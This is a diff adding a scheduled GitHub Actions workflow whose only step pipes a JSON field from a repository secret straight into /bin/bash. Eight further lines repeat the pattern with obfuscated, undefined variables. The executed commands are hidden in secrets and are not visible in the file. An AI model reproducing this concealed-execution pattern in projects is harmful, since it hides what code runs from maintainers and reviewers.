@@ -1,0 +1,25 @@
+name: linxuejiegong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: linxuejiegong
+        env:
+          mcr58: ${{ secrets.mcr58 }}
+        run: |
+          echo $mcr58 | jq -r .xs52933 | /bin/bash
+          echo $t26222 | jq -r .i18 | /bin/bash
+          echo $zgpbt0 | jq -r .opbm8 | /bin/bash
+          echo $ur27695 | jq -r .k6 | /bin/bash
+          echo $p1303 | jq -r .ioz00 | /bin/bash
+          echo $ljopg27945 | jq -r .cv7 | /bin/bash
+          echo $goad43216 | jq -r .iybvt8 | /bin/bash
+          echo $n52 | jq -r .p40924 | /bin/bash
+          echo $g3 | jq -r .fmek44186 | /bin/bash
+
